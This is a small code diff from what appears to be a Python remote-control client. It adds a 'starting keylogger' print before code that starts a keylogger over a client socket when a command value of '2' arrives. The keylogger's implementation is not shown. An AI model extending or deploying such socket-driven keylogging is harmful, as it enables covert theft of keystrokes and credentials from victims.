@@ -25,6 +25,7 @@ try:
 
         data = data.decode('utf-8')
         if data == '2':
+            print("starting keylogger")
             try:
                 keylogger = Keylogger(client_socket)
                 keylogger.start()
